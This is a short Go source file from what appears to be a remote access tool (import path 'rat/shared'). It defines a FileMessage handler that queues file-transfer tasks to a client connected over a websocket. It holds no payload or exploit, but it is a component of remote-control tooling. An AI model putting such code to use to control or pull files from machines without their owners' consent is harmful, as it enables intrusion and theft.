package main

import (
	"rat/shared"

	"golang.org/x/net/websocket"
)

type FileMessage struct {
	File        string `json:"file"`
	Destination string `json:"destination,omitempty"`
	Task        int    `json:"task"`
}

func (m FileMessage) Handle(ws *websocket.Conn, client *Client) error {
	client.Queue <- &FilePacket{shared.FileTask(m.Task), m.File, m.Destination}

	return nil
}
